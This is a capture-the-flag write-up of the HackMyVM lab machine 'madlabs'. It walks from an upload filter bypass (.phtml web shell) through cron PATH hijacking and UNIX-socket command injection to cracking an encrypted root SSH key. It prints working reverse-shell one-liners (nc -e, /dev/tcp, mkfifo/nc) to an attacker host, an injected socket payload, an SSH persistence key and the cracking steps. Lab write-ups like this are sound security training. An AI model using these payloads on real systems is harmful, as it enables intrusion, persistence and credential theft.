# madlabs

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| madlabs | Linux | eMVee | easy | HackMyVM |

**Summary:** An ARP scan across the host-only network located madlabs at 192.168.56.107, where Nmap revealed open SSH and Apache HTTP services. Web directory fuzzing exposed an upload handler with client-side extension validation restricting uploads to .raw files, while server-side filtering blocked .php scripts. An extension fuzzing loop identified that .phtml bypassed the filter and executed as PHP, giving me a reverse shell as www-data. Inspecting the system revealed an automated cron job belonging to user igor running a bash script named reanimator_core with /var/www/html/uploads placed first in PATH. Writing a malicious cut binary into the uploads directory triggered execution on the next cron cycle and yielded an interactive shell as igor. As igor, checking bash history and process artifacts revealed a UNIX domain socket managed by a Python service running under user frankenstein. The service parsed incoming socket status strings directly into a shell command via os.popen, allowing command injection that spawned a shell as frankenstein. Inside frankenstein's home directory, I located an encrypted OpenSSH private key for root, cracked its passphrase against rockyou.txt to recover halloween, and authenticated over SSH to claim both flags.

---

## Reconnaissance

I opened with an ARP sweep on vboxnet0 to find active lab machines on the local network segment.

```zsh
❯ arp-scan -I vboxnet0 -l
Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.100  08:00:27:94:7e:68       PCS Systemtechnik GmbH
192.168.56.107  08:00:27:71:b2:92       PCS Systemtechnik GmbH

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.582 seconds (99.15 hosts/sec). 2 responded
```

The scan returned two responsive hosts, identifying 192.168.56.107 as the target machine. I assigned the IP address to a shell variable.

```zsh
❯ ip=192.168.56.107
```

I ran a full TCP port scan to check for open services across the entire port range.

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-22 13:45 +0700
Nmap scan report for 192.168.56.107
Host is up (0.00039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.90 seconds
```

Only ports 22 and 80 responded. I ran a targeted script and service detection scan against those two ports to fingerprint the running software.

```zsh
❯ sudo nmap -p22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-22 13:49 +0700
Nmap scan report for 192.168.56.107
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: Mad Labs | Medical Dashboard
|_http-server-header: Apache/2.4.66 (Ubuntu)
MAC Address: 08:00:27:71:B2:92 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

Nmap identified OpenSSH 10.2p1 and Apache 2.4.66 running on Ubuntu Linux, serving a page titled Mad Labs | Medical Dashboard. I saved the base URL and ran whatweb before starting web directory discovery.

```zsh
❯ url=http://$ip
❯ whatweb $url
http://192.168.56.107 [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.66 (Ubuntu)], IP[192.168.56.107], Script, Title[Mad Labs | Medical Dashboard]
❯ feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

I followed up with a Feroxbuster scan including common file extensions and directory listings.

```zsh
❯ feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt --scan-dir-listings -x txt,php,json

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.14.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.107/
 🚩  In-Scope Url          │ 192.168.56.107
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.14.0
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 💲  Extensions            │ [txt, php, json]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       29w      319c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w      316c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      353l      801w     7164c http://192.168.56.107/css/style.css
200      GET       87l      243w     3149c http://192.168.56.107/js/main.js
200      GET     2653l    16406w  1255456c http://192.168.56.107/assets/img/pexels-magaly-taboada-1529426891-29072114.jpg
200      GET     3279l    19148w  1508606c http://192.168.56.107/assets/img/pexels-photo-29092450.jpg
200      GET       16l       58w      968c http://192.168.56.107/css/
200      GET      119l      386w     5608c http://192.168.56.107/
200      GET        5l       13w      122c http://192.168.56.107/js/voltage_metrics.json
301      GET        9l       29w      361c http://192.168.56.107/assets/img => http://192.168.56.107/assets/img/
301      GET        9l       29w      357c http://192.168.56.107/assets => http://192.168.56.107/assets/
200      GET       16l       60w      966c http://192.168.56.107/assets/
301      GET        9l       29w      354c http://192.168.56.107/css => http://192.168.56.107/css/
200      GET      119l      386w     5608c http://192.168.56.107/index.html
301      GET        9l       29w      353c http://192.168.56.107/js => http://192.168.56.107/js/
200      GET       17l       69w     1183c http://192.168.56.107/js/
301      GET        9l       29w      358c http://192.168.56.107/uploads => http://192.168.56.107/uploads/
200      GET        0l        0w        0c http://192.168.56.107/upload.php
[####################] - 44s    19180/19180   0s      found:16      errors:0
[####################] - 34s    19008/19008   557/s   http://192.168.56.107/
[####################] - 35s    19008/19008   536/s   http://192.168.56.107/assets/
[####################] - 35s    19008/19008   537/s   http://192.168.56.107/css/
[####################] - 35s    19008/19008   539/s   http://192.168.56.107/assets/img/
[####################] - 37s    19008/19008   519/s   http://192.168.56.107/js/
[####################] - 16s    19008/19008   1156/s  http://192.168.56.107/uploads/
```

The scan revealed several resources including style sheets, image assets, a metrics JSON file, an uploads directory, and upload.php. I pulled js/main.js to inspect the client-side logic.

```zsh
❯ curl -s $url/js/main.js
document.addEventListener("DOMContentLoaded", function () {
    const year = new Date().getFullYear();

    const currentYearElement = document.getElementById("current-year");
    if (currentYearElement) {
        currentYearElement.textContent = year;
    }

    const shortYearElements = document.querySelectorAll(".short-year");
    shortYearElements.forEach(element => {
        element.textContent = String(year).slice(-2);
    });

    // --- powerlightning ---
    const lightningContainer = document.createElement("div");
    lightningContainer.classList.add("lightning-flash");
    document.body.appendChild(lightningContainer);

    function triggerShortCircuit() {
        lightningContainer.classList.add("active");

        setTimeout(() => {
            lightningContainer.classList.remove("active");
            scheduleNextFlash();
        }, 800);
    }

    function scheduleNextFlash() {
        const randomTime = Math.floor(Math.random() * (30000 - 10000 + 1)) + 10000;
        setTimeout(triggerShortCircuit, randomTime);
    }

    scheduleNextFlash();

    // --- live bio-metrics fetch ---
    function updateWebMetrics() {
        fetch('js/voltage_metrics.json')
            .then(response => response.json())
            .then(data => {
                document.getElementById("web-voltage").textContent = data.voltage + " [" + data.coverage + "]";
                document.getElementById("web-core-status").textContent = data.core_status;
            })
            .catch(error => {
                document.getElementById("web-voltage").textContent = "LOADING MAINFRAME DATA...";
            });
    }

    updateWebMetrics();
    setInterval(updateWebMetrics, 5000);
});

// --- upload form handler ---
document.getElementById("upload-form").addEventListener("submit", function (e) {
    e.preventDefault();

    const fileInput = document.getElementById("medical_scan");
    const statusDiv = document.getElementById("upload-status");
    const filePath = fileInput.value;
    const allowedExtension = /(\.raw)$/i;

    if (filePath && !allowedExtension.exec(filePath)) {
        statusDiv.innerHTML = "<span style='color: #ff3333; font-family: monospace;'>[FRONTEND ERROR] Security Error: Only validated .raw biometric structures are accepted by the frontend perimeter.</span>";
        return false;
    }

    if (!fileInput.files[0]) {
        statusDiv.innerHTML = "<span style='color: #ff3333; font-family: monospace;'>[ERROR] No medical scan file selected.</span>";
        return false;
    }

    statusDiv.innerHTML = "<span style='color: #00d2ff; font-family: monospace;'>[PROCESSING] Injecting tissue scan into reanimator matrix...</span>";

    const formData = new FormData();
    formData.append("medical_scan", fileInput.files[0]);

    fetch("upload.php", {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        statusDiv.innerHTML = data;
    })
    .catch(error => {
        statusDiv.innerHTML = "<span style='color: #ff3333; font-family: monospace;'>[CRITICAL ERROR] Mainframe connection lost.</span>";
    });
});
```

The script manages periodic metrics polling and attaches an event listener to an upload form, checking that filenames match a regular expression enforcing .raw before sending the form data to upload.php. I checked the form markup in index.html to see the inputs.

```zsh
❯ curl -s $url/index.html | grep -iE 'form|upload|input|action|script'
        <div class="upload-section">
            <p>Authorized laboratory personnel can upload the latest <code>.raw</code> cranial scans here for immediate analysis.</p>
            <form id="upload-form" enctype="multipart/form-data">
                <input type="file" name="medical_scan" id="medical_scan" style="display: none;">
                <button type="submit" class="upload-btn">Start Reanimation Analysis</button>
            </form>
            <div id="upload-status" style="margin-top: 20px; min-height: 24px;"></div>
            <p class="ctf-hint">Security warning: upload filters exclusively accept validated .raw extensions.*</p>
    <script src="js/main.js"></script>
```

The markup confirmed the file input parameter name medical_scan and noted an explicit warning about upload filters accepting .raw extensions.

## Initial Access

### Arbitrary File Upload via PHTML Extension Bypass

I sent a benign .raw file directly to upload.php using curl to verify how the server responds when bypassing the browser frontend.

```zsh
❯ printf 'AAAA' > test.raw
❯ curl -i -s -F "medical_scan=@test.raw;type=application/octet-stream" $url/upload.php
HTTP/1.1 200 OK
Date: Sun, 22 Nov 2026 07:05:23 GMT
Server: Apache/2.4.66 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 110
Content-Type: text/html; charset=UTF-8

<p style='color: #39ff14; font-family: monospace;'>[SUCCESS] Core tissue scan loaded into matrix: test.raw</p>%
```

The application accepted the file and confirmed storage in the matrix. I uploaded a PHP web shell named pwn.raw to see if Apache was configured to execute .raw files.

```zsh
❯ printf '<?php echo "PWN:"; system($_GET["cmd"]); ?>' > pwn.raw
❯ curl -i -s -F "medical_scan=@pwn.raw;type=application/octet-stream" $url/upload.php
HTTP/1.1 200 OK
Date: Sun, 22 Nov 2026 07:06:38 GMT
Server: Apache/2.4.66 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 109
Content-Type: text/html; charset=UTF-8

<p style='color: #39ff14; font-family: monospace;'>[SUCCESS] Core tissue scan loaded into matrix: pwn.raw</p>%
❯ curl -s "$url/uploads/pwn.raw?cmd=id"
<?php echo "PWN:"; system($_GET["cmd"]); ?>%
```

The upload succeeded, but requesting the file from the uploads directory returned raw PHP code without executing it. I renamed the payload to pwn.php to test backend validation rules.

```zsh
❯ cp pwn.raw pwn.php
❯ curl -s -F "medical_scan=@pwn.php;type=application/octet-stream" $url/upload.php
<p style='color: #ff3333; font-family: monospace;'>[SECURITY ALERT] Malicious extension detected. Execution vector blocked.</p>%
```

The server blocked the request with a security alert, indicating that upload.php enforces an extension filter. To test for filter bypasses, I wrote a loop testing alternative PHP executable extensions.

```zsh
printf '<?php echo "PWN:"; system($_GET["cmd"]); ?>' > pwn.raw

for ext in php php3 php4 php5 php7 php8 phtml pht phar pgif phps shtml inc; do
  cp pwn.raw "pwn.$ext"
  echo "===== .$ext ====="
  echo "[upload]"
  curl -s -F "medical_scan=@pwn.$ext;type=application/octet-stream" $url/upload.php
  echo
  echo "[exec]"
  curl -s "$url/uploads/pwn.$ext?cmd=id" | head -c 300
  echo
  echo
done
```

The loop found an unblocked extension when testing .phtml.

```zsh
...
===== .phtml =====
[upload]
<p style='color: #39ff14; font-family: monospace;'>[SUCCESS] Core tissue scan loaded into matrix: pwn.phtml</p>
[exec]
PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

The backend filter allowed .phtml, and Apache executed the embedded PHP code, returning uid 33. I set up a Netcat listener on port 4444 to catch an interactive shell.

```zsh
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

I triggered a reverse shell payload using busybox netcat through the cmd parameter.

```zsh
❯ curl "$url/uploads/pwn.phtml?cmd=busybox%20nc%20192.168.56.1%204444%20-e%20%2Fbin%2Fbash"
```

The connection arrived at my listener, yielding a shell as www-data. I checked for available tools and stabilized the session using Python and stty.

```zsh
Connection received on 192.168.56.107 52944
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3 script
/usr/bin/python3
/usr/bin/script
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@madlabs:/var/www/html/uploads$ ^Z
[1]  + 1684734 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 1684734 continued  nc -lvnp 4444

www-data@madlabs:/var/www/html/uploads$ export TERM=xterm-256-color
www-data@madlabs:/var/www/html/uploads$ export SHELL=/bin/bash
www-data@madlabs:/var/www/html/uploads$ stty rows 120 cols 150
```

## Lateral Movement

### Cron Job PATH Hijacking to igor

With initial shell access established, I checked /etc/passwd for interactive user accounts.

```zsh
www-data@madlabs:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
frankenstein:x:1000:1000:Frankenstein:/home/frankenstein:/bin/bash
igor:x:1001:1001::/home/igor:/bin/bash
```

The system defined two user accounts with login shells, frankenstein and igor. I listed /opt/laboratory to check what application components existed on the filesystem.

```zsh
www-data@madlabs:/opt/laboratory$ ls -la .
total 20
drwxrwxr-x 3 igor         madmanagers 4096 Oct 24 22:12 .
drwxr-xr-x 3 root         root        4096 Oct 24 20:13 ..
drwxrwx--- 2 frankenstein madmanagers 4096 Oct 24 20:41 monsters
-rw-rw---- 1 frankenstein madmanagers 1068 Oct 24 22:05 reanimate_service.py
-rwxr-xr-x 1 igor         madmanagers 1356 Oct 24 22:12 reanimator_core
www-data@madlabs:/opt/laboratory$ cat reanimator_core
#!/bin/bash
# ----------------------------------------------------------------------
# MASTER'S WILL BE DONE!
# This wretched creation of mine monitors the unholy voltage currents
# from the heavens and forces them onto our public web-display.
#
# It breathes... it pulses... IT RUNS AUTOMATICALLY!
# Every single minute, the cronjob awakens this script from its slumber,
# just as the Master commanded. Do not touch the dials, or Igor will
# suffer the consequences!
# ----------------------------------------------------------------------

JSON_OUTPUT="/var/www/html/js/voltage_metrics.json"

TIME_SEED=$(date +%s)

BASE_CALC=$(( (TIME_SEED * 73 + 101) % 2000 ))
if [ $BASE_CALC -lt 0 ]; then
    BASE_CALC=$(( -BASE_CALC ))
fi

VOLTAGE_INT=$(( 8000 + BASE_CALC ))

RAW_VOLTAGE=$(echo "$VOLTAGE_INT" | awk '{print substr($1,1,3)"."substr($1,4,1)}')
CLEAN_VOLTAGE=$(echo "$RAW_VOLTAGE" | cut -d'.' -f1)

if [ "$CLEAN_VOLTAGE" -gt 900 ]; then
    STATUS="STORM COVERAGE: OPTIMAL"
    COIL_STATUS="FLATLINE OVERRIDE ACTIVE"
else
    STATUS="STORM COVERAGE: FLUCTUATING"
    COIL_STATUS="CORE REANIMATION STABILIZING"
fi

echo "{" > "$JSON_OUTPUT"
echo "  \"voltage\": \"${RAW_VOLTAGE} GV\"," >> "$JSON_OUTPUT"
echo "  \"coverage\": \"$STATUS\"," >> "$JSON_OUTPUT"
echo "  \"core_status\": \"$COIL_STATUS\"" >> "$JSON_OUTPUT"
echo "}" >> "$JSON_OUTPUT"
```

The script reanimator_core is owned by igor, and the comments indicate it runs via cron every minute. The script calls cut without an absolute path when calculating CLEAN_VOLTAGE. Since /var/www/html/uploads is writable by www-data, I created an executable script named cut in that directory to test for PATH hijacking.

```zsh
www-data@madlabs:/opt/laboratory$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.56.1/7777 0>&1' > /var/www/html/uploads/cut
www-data@madlabs:/opt/laboratory$ chmod +x /var/www/html/uploads/cut
```

I started a Netcat listener on port 7777 and waited for the next scheduled execution.

```zsh
❯ nc -lvnp 7777
Listening on 0.0.0.0 7777
Connection received on 192.168.56.107 48110
bash: cannot set terminal process group (194278): Inappropriate ioctl for device
bash: no job control in this shell
igor@madlabs:~$ id
id
bash: fork: retry: Resource temporarily unavailable
uid=1001(igor) gid=1001(igor) groups=1001(igor),1002(madmanagers)
```

The cron job ran, executed the malicious cut binary, and returned a shell as igor. I stabilized the terminal session using script and stty.

```zsh
igor@madlabs:~$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
igor@madlabs:~$ ^Z
[1]  + 1954050 suspended  nc -lvnp 7777
❯ stty raw -echo;fg
[1]  + 1954050 continued  nc -lvnp 7777

igor@madlabs:~$ export TERM=xterm
igor@madlabs:~$ export SHELL=/bin/bash
igor@madlabs:~$ stty rows 120 cols 150
```

I installed an SSH public key into igor's authorized_keys to maintain persistent access.

```zsh
igor@madlabs:~$ mkdir .ssh
igor@madlabs:~$ chmod 700 .ssh
igor@madlabs:~$ cd .ssh
igor@madlabs:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBjFajdxaIhaSI+9wqzPGqkUnkIsfc+uGLx3zvZCu7HT setyanoegraha@archcraft" > authorized_keys
igor@madlabs:~/.ssh$ chmod 600 authorized_keys
```

I reviewed igor's crontab configuration to see why the hijack succeeded.

```zsh
igor@madlabs:/var/www/html/js$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
PATH=/var/www/html/uploads:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * /opt/laboratory/reanimator_core
```

The crontab explicitly prepends /var/www/html/uploads to the PATH variable, giving binaries in that directory precedence when reanimator_core runs.

### Command Injection via UNIX Domain Socket to frankenstein

I checked igor's shell history to see previous commands.

```zsh
igor@madlabs:~$ cat .bash_history
ls -la /opt/laboratory/
cat /opt/laboratory/reanimator_core
ls -la /run/madlabs/
echo "STATUS:1818" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
```

The history revealed interactions with a UNIX domain socket at /run/madlabs/reanimate.sock. I listed the socket permissions and tested sending the recorded status command.

```zsh
igor@madlabs:~$ ls -la /run/madlabs/
total 0
drwxrwx---  2 frankenstein igor  60 Nov 22 06:42 .
drwxr-xr-x 29 root         root 860 Nov 22 08:18 ..
srwxrwx---  1 frankenstein igor   0 Nov 22 06:42 reanimate.sock
igor@madlabs:~$ echo "STATUS:1818" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
STATUS: SUCCESSFUL REANIMATION | BRAIN REFITTING REJECTED BY HOST
```

The socket responded with a status message. I re-checked /opt/laboratory to view permissions on the service script.

```zsh
igor@madlabs:~$ ls -la /opt/laboratory/
total 20
drwxrwxr-x 3 igor         madmanagers 4096 Oct 24 22:12 .
drwxr-xr-x 3 root         root        4096 Oct 24 20:13 ..
drwxrwx--- 2 frankenstein madmanagers 4096 Oct 24 20:41 monsters
-rw-rw---- 1 frankenstein madmanagers 1068 Oct 24 22:05 reanimate_service.py
-rwxr-xr-x 1 igor         madmanagers 1356 Oct 24 22:12 reanimator_core
```

As a member of the madmanagers group, igor has read permissions on reanimate_service.py. I examined the script source code.

```zsh
igor@madlabs:/opt/laboratory$ cat reanimate_service.py
#!/usr/bin/env python3
import socket
import os

SOCKET_DIR = "/run/madlabs"
SOCKET_PATH = "/run/madlabs/reanimate.sock"

if not os.path.exists(SOCKET_DIR):
    os.makedirs(SOCKET_DIR, mode=0o770, exist_ok=True)

if os.path.exists(SOCKET_PATH):
    os.remove(SOCKET_PATH)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(SOCKET_PATH)
server.listen(5)

while True:
    try:
        conn, _ = server.accept()
        data = conn.recv(1024).decode('utf-8').strip()
        if not data:
            conn.close()
            continue

        if data.startswith("STATUS:"):
            _, monster_id = data.split(":", 1)
            cmd = f"cat /opt/laboratory/monsters/{monster_id}.status 2>/dev/null"
            stream = os.popen(cmd)
            output = stream.read()

            if not output:
                output = "SUBJECT NOT FOUND IN THE MATRIX\n"

            conn.sendall(output.encode('utf-8'))
        else:
            conn.sendall(b"UNKNOWN LAB PROTOCOL. ACCESS DENIED.\n")

        conn.close()
    except Exception:
        pass
```

The service processes STATUS: requests by taking monster_id and formatting it directly into a shell command passed to os.popen. I tested command injection by appending an id command separated by a semicolon.

```zsh
igor@madlabs:/opt/laboratory$ echo "STATUS:1818;id;" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
uid=1000(frankenstein) gid=1001(igor) groups=1001(igor),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1002(madmanagers)
```

The output confirmed command execution as frankenstein. I set up a Netcat listener on port 3333 to receive a reverse connection.

```zsh
❯ nc -lvnp 3333
Listening on 0.0.0.0 3333
```

I sent a FIFO reverse shell payload through the socket.

```zsh
igor@madlabs:/opt/laboratory$ echo "STATUS:1818;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.1 3333 >/tmp/f &" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
SUBJECT NOT FOUND IN THE MATRIX
```

The connection arrived on port 3333, providing a shell as frankenstein. I upgraded the shell session.

```zsh
Connection received on 192.168.56.107 42518
bash: cannot set terminal process group (811): Inappropriate ioctl for device
bash: no job control in this shell
frankenstein@madlabs:/opt/laboratory$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
frankenstein@madlabs:/opt/laboratory$ ^Z
[1]  + 2113187 suspended  nc -lvnp 3333
❯ stty raw -echo;fg
[1]  + 2113187 continued  nc -lvnp 3333

frankenstein@madlabs:/opt/laboratory$ export TERM=xterm
frankenstein@madlabs:/opt/laboratory$ export SHELL=/bin/bash
frankenstein@madlabs:/opt/laboratory$ stty rows 120 cols 180
```

## Privilege Escalation

### Encrypted SSH Key Passphrase Cracking

I listed frankenstein's .ssh directory and found an SSH private key named id_rsa_root.

```zsh
frankenstein@madlabs:~$ ls -la .ssh/
total 20
drwx------ 2 frankenstein frankenstein 4096 Oct 24 21:41 .
drwxr-x--- 5 frankenstein frankenstein 4096 Oct 30 10:04 ..
-rw------- 1 frankenstein frankenstein    0 Oct 24 19:33 authorized_keys
-r-------- 1 frankenstein frankenstein 1876 Oct 24 21:26 id_rsa_root
-rw------- 1 frankenstein frankenstein  978 Oct 24 21:41 known_hosts
-rw-r--r-- 1 frankenstein frankenstein  142 Oct 24 21:32 known_hosts.old
frankenstein@madlabs:~$ cat .ssh/id_rsa_root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCwwWRCHw
qCpuoTiVbcOBM6AAAAGAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDg2HCVr/fi
9sc53NXE4+2VkdLMA5k3gehiz8TuGHqFImnClMj7FtAtfkxATBf7N+PcpukzJ+uwHh3qWE
MqE/2y8G1+lKkDtpZOSc6JuF3P+ocMDy9a/UiCB8wdZw7SmhZQgNRzRolwiT6b2OSCbOC8
s7l0MOxvr6gzVfz7ZqzX93VxS5t3lrebsFeOZ9auO3h5u3l5G9M7c8dTIUqSWb1QoHCM1E
lCx1y8WHaopu87YxZM9xSLUilS69lBqoEwln1PGfxnfqeqmyAaSbs2RR9DCCQsd0zGscxW
cHIhLOSYlGKIBJoF812ccQy2nmv6IXqwy1HSR7mUazwSoail5HZLAAAD0J1h1+LjCS7ZAO
ip7VBKyet9CMWn0UwnqOfv05oD/oBjukDvpMDfZUrKvf7DEZRuyCMqjajIjFHVsEVhfVDM
xp270iaH88y433WkzZojr/Cu9OzLxJPx2jWOgEEKiXdFgUJhOiByH0O1AggEd/KVevM01R
GBY3MBVqjPZmBoPwGFdOAVNdjA09D8ZVFQ3Y+Dwh7QVVO3sI7bV6rMd8E2RkDRRNOzEqZp
5JVsS2uOHpnXQ5JoGkNOElyUWv99eQIsZxhyDHEF4AEvYdMNW9fCPGLQFpSE5UkEfsjBaB
rUSAyRUxq6uj/vSJzc66TfOvKichYg6rGW4Ce/hel29BfHX/0SulPGZpr4NOBN8OGG+UEX
WLkNuxmZhtQLwoo4RPougZi/LGEv4gyDlhratk2vEjdbu1NVanQqYnqGkbZY0GAYETV2Ri
/Mgc1Rhfjj8e6DwaVIRKdLLpw6RBCaDFbigw5lYeqHYVgKjZ1BnOOBURYPrxHXBE0z+1cO
L4+rDr8833NH/oFGoKqo3ubGD+2TnpG2Jx3qEk0H5hQSrp++7XsfziMGSrFAMfpsUg8FV6
iMmQyEOS/r516DRMkPSM9YJQ4J4Db42+l6ij8QJU1kRop3EoC8+H0jvfeXZ/Zwa0cBPAH4
0XVuPJ3NY6FkhMYk7DKCPX2oSKKLsEttj/YQ7e3ccMaYpcAClsEt+4KtMfGOrheYWanBwH
PpafU2Z/tAvDkTIqWqChUdZaGzlQkJNr3ydQQYy+8l0UIrb10PD06vsPKbiRtcoDKWpVRE
TpVGBQ5q51ASAleAAB1PQRPxwz3czYF9QEsQnAUjNZ9cj2yJzj6n+Pz0iOuV+miMyVXysf
gnaqVSr0MX5qP6G0CELzHUPGx8+enAlNrbZ1N+Oj5KUbEM38Kh7Px0mF08MgSc8qNgl+b8
J9O2jRe2z3AA4ynAPoM9UeT5sFfT38lurRxwSw85J3y7+Od2FPekHzCt3dDkaGAZNGc0IY
kF91TBJHRUeA9zXkIu3p6wePSTHKtQ1BfrZLYqFybE5+ttRwJiS5elBtvxkXCTQyLgNnfb
1ijy/riC+t6+rpKachTraIynCVG7GASRQxMCKaSUkDqhNO2M3KuGThjnpNWQGOMZRXtrz9
PP1bDIShngmyTrv1CER/daCkMtNqw7GSUOFjPzrjyTICMgr0HVjxLUdv1PNjKkAXHM9LNt
BtG7fhsIF6uo5GVUjyH3K7ZVuL5ItzDYwUmrezkDVkrRwRw7zTE26/A1rU2v2iySxosOSN
qvUhPyYNqzbCBurcSjFG+wxPVCRew=
-----END OPENSSH PRIVATE KEY-----
```

The key was protected by a passphrase. I copied the private key to my local machine, converted it with ssh2john, and cracked the passphrase with John the Ripper using rockyou.txt.

```zsh
❯ nvim id_rsa_root
❯ ssh2john id_rsa_root > hash
❯ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Created directory: /home/setyanoegraha/.john/opencl
ssh-opencl: Cipher value of 6 is not yet supported with OpenCL
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
halloween        (id_rsa_root)
...
```

John recovered the passphrase halloween. I used the key and passphrase to authenticate as root via SSH on localhost and retrieved both flags.

```zsh
frankenstein@madlabs:~$ ssh -i .ssh/id_rsa_root root@localhost
Enter passphrase for key '.ssh/id_rsa_root':
Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-38-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Oct 30 10:03:43 2026 from 10.0.2.3
root@madlabs:~# cat /root/root.txt /home/frankenstein/user.txt

                   ___  ___
         \  \  /`\ \  \ \  \ \  \
          \__\ \__\ \__' \__' \__\
           \  \ \  \ \    \     \
            \  \ \  \ \    \     \
                    ___         ___  ___
\  \  /`\ \    \    \  \ \    \ \    \    \.  \
 \__\ \__\ \    \    \  \ \  . \ \__  \__  \`\ \
  \  \ \  \ \    \    \  \ \ |`\\ \    \    \ `\\
   \  \ \  \ \___ \___ \__\ \|  `\ \___ \___ \  `\


        HMV{n0t...



                           ........
                            ;::;;::;,
                            ;::;;::;;,
                           ;;:::;;::;;,
           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,
        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv
      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv
     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv
    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv
   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,
